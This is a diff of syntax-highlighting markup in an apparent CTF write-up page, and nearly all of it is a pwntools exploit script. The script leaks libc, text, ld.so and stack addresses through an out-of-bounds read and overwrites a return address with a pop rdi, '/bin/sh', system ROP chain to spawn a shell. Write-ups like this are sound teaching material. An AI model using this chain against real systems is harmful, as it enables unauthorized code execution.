@@ -397,11 +397,11 @@ After doing some reversing, we found that it’s a <a href="https://en.wikipedia
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
@@ -409,33 +409,33 @@ After doing some reversing, we found that it’s a <a href="https://en.wikipedia
 <span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
     <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
     <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
-        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
         <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
     <span class="k">return</span> <span class="n">res</span>
 
 <span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">str_addr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span> <span class="c1"># search string address in file
-</span>    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+</span>    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="c1"># no result
 </span>        <span class="k">return</span> <span class="bp">None</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
 
 <span class="k">def</span> <span class="nf">leak_one_byte</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off_1</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
-    <span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off_1</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
     <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">leak_addr</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">off_80</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
     <span class="n">ret_addr</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
-        <span class="k">print</span> <span class="s">"leaking </span><span class="si">%</span><span class="s">s byte : </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">"leaking %s byte : %d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
         <span class="n">ret</span> <span class="o">=</span> <span class="n">leak_one_byte</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">off_80</span><span class="p">)</span>
         <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">|</span> <span class="p">((</span><span class="n">ret</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="o">*</span><span class="n">cnt</span><span class="p">)</span>
         <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
@@ -454,15 +454,15 @@ After doing some reversing, we found that it’s a <a href="https://en.wikipedia
     <span class="n">ret_addr</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span> <span class="o">=</span> <span class="n">cal_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">)</span>
-    <span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
     <span class="n">off_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">off_80</span> <span class="o">-</span> <span class="n">temp</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="n">off_1</span>
 
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span> <span class="n">off_1</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
-        <span class="k">print</span> <span class="s">"leaking </span><span class="si">%</span><span class="s">s byte : </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
-        <span class="n">ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
+        <span class="k">print</span> <span class="s">"leaking %s byte : %d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
         <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">|</span> <span class="p">((</span><span class="n">ret</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="o">*</span><span class="n">cnt</span><span class="p">)</span>
         <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
 
@@ -471,16 +471,16 @@ After doing some reversing, we found that it’s a <a href="https://en.wikipedia
 <span class="k">def</span> <span class="nf">write_far_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
     <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span> <span class="o">=</span> <span class="n">cal_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">)</span>
-    <span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
     <span class="n">off_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">off_80</span> <span class="o">-</span> <span class="n">temp</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="n">off_1</span>
 
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span> <span class="n">off_1</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
         <span class="n">v</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">cnt</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
-        <span class="k">print</span> <span class="s">"writing </span><span class="si">%</span><span class="s">s byte </span><span class="si">%</span><span class="s">d : </span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
+        <span class="k">print</span> <span class="s">"writing %s byte %d : %x"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
         <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
@@ -492,7 +492,7 @@ After doing some reversing, we found that it’s a <a href="https://en.wikipedia
 </span>    <span class="n">preline</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"wc -l ./bbb | awk '{print $1}'"</span><span class="p">)</span>
     <span class="n">preline</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">preline</span><span class="p">)</span>
     <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"./bbb"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
     <span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">80</span><span class="o">-</span><span class="n">preline</span><span class="p">)</span>
     
     <span class="n">r</span><span class="p">,</span> <span class="n">LD</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
@@ -504,17 +504,17 @@ After doing some reversing, we found that it’s a <a href="https://en.wikipedia
         <span class="n">LD</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib64/ld-linux-x86-64.so.2"</span><span class="p">)</span>
 
     <span class="c1"># send program
-</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; "</span><span class="p">)</span>
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; "</span><span class="p">)</span>
 
     <span class="c1"># leak libc
 </span>    <span class="n">libc_main</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="o">-</span><span class="mi">48</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s">"libc_main"</span><span class="p">)</span>
     <span class="n">libc_base</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="n">bin_sh</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
     <span class="c1"># for local
 </span>    <span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
-        <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">libc_main</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
-        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span>
-        <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+        <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">libc_main</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
+        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span>
+        <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
         <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">str_addr</span><span class="p">(</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">,</span> <span class="n">libc</span><span class="p">)</span>
     <span class="c1"># for remote
 </span>    <span class="k">else</span><span class="p">:</span> 
@@ -526,44 +526,44 @@ After doing some reversing, we found that it’s a <a href="https://en.wikipedia
 </span>    <span class="n">text_base</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="o">-</span><span class="mi">56</span><span class="p">,</span> <span class="o">-</span><span class="mi">9</span><span class="p">,</span> <span class="s">"text_base"</span><span class="p">)</span>
     <span class="n">text_base</span> <span class="o">-=</span> <span class="mh">0xb00</span>
 
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
     
     <span class="c1"># leak r_debug
 </span>    <span class="n">r_debug</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">7</span><span class="p">,</span> <span class="s">"r_debug"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"r_debug: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">r_debug</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"r_debug: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">r_debug</span><span class="p">))</span>
 
     <span class="c1"># traverse link_map structure &amp; leak ld-linux.so base address
 </span>    <span class="n">link_map_addr</span> <span class="o">=</span> <span class="n">r_debug</span> <span class="o">+</span> <span class="mi">8</span>
     <span class="n">link_map_text</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_text"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_text: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_text</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_text: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_text</span><span class="p">))</span>
     <span class="n">link_map_vdso</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_text</span><span class="o">+</span><span class="mi">24</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_vdso"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_vdso: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_vdso</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_vdso: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_vdso</span><span class="p">))</span>
     <span class="n">link_map_libc</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_vdso</span><span class="o">+</span><span class="mi">24</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_libc"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_libc: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_libc</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_libc: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_libc</span><span class="p">))</span>
     <span class="n">link_map_ld</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_libc</span><span class="o">+</span><span class="mi">24</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_ld"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_ld: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_ld</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_ld: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_ld</span><span class="p">))</span>
     <span class="n">ld_base</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_ld</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ld_base"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ld_base</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ld_base</span><span class="p">))</span>
     <span class="c1"># leak __libc_stack_end in ld-linux.so, get stack address
-</span>    <span class="n">LD</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">ld_base</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_stack_end: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">LD</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">]))</span>
-    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">LD</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">],</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"stack addr"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+</span>    <span class="n">LD</span><span class="p">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">ld_base</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_stack_end: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">LD</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">]))</span>
+    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">LD</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">],</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"stack addr"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
     
     <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x000000000000120c</span>
     <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mi">216</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ret_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop_rdi: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"bin_sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ret_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop_rdi: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"bin_sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
     
     <span class="c1"># overwrite return address
 </span>    <span class="n">write_far_addr</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ret_addr"</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">)</span>
     <span class="n">write_far_addr</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ret_addr+8"</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">)</span>
     <span class="n">write_far_addr</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">+</span><span class="mi">16</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ret_addr+16"</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>
 
